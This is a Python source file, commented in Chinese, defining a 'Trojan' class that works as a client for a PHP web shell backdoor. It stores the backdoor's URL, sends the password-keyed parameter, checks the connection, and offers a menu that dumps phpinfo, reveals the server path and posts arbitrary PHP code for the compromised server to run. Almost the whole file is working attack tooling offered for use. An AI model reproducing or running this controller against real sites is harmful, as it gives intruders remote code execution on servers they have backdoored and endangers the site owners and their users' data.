import requests
import sys
import re

#初始化连接
class Trojan():
    url = ""
    passWord = ""
    payload = {}
    req = ""
    cmdBox = {}
    def connect(self):
        try:
            file = open('Trojan.tmp')
        except:
            fp = open('Trojan.tmp','w')
            fp.close()
            file = open('Trojan.tmp')

        self.url = file.readline()
        if 'http' not in self.url:
            self.url = input('输入一句话木马客户端地址:\n')
            fp = open('Trojan.tmp','w')
            fp.write(self.url)
            fp.close()
        self.passWord = input('输入密码:\n')

        self.req = requests.session()
        self.payload = {self.passWord : 'echo "try";'}
        test = self.req.post(self.url,data = self.payload)
        if 'try' not in test.text:
            print(test.text)
            print('Can\'t to connect')
            fp = open('Trojan.tmp','w')
            fp.close()
            sys.exit(1)
        pass

    #用户界面
    def display(self):
        print('''


1.网站信息
2.当前目录
3.执行php代码
4.退出
5.打印帮助
        ''')
        pass
    #接到命令发送/处理
    def command(self):
        cmd = input("指令:\n")
        self.cmdBox = {'1':'self.info()','2':'self.dir()','3':'self.eval()','4':'sys.exit(0)','5':'self.display()'}
        try:
            eval(self.cmdBox[cmd])
        except:
            print('参数错误\n\n')
            self.command()

    def go(self,display = True):
        result = self.req.post(self.url , data = self.payload)
        if display:
            print(result.text)
        return result.text

    #命令集
    def info(self):
        self.payload[self.passWord] = "echo phpinfo();"
        result = self.go(display = False)
        #print(result)
        result = re.sub("<style[.\s\S]*?</style>", '', result)
        result = re.sub(r'<.*?>','',result)
        print(result)
        pass

    def dir(self):
        self.payload[self.passWord] = "echo dirname(__FILE__);"
        result = self.go()
        pass

    def eval(self):
        cmd = input('input the PHP code:\n')
        self.payload[self.passWord] = cmd
        result = self.go()
        pass
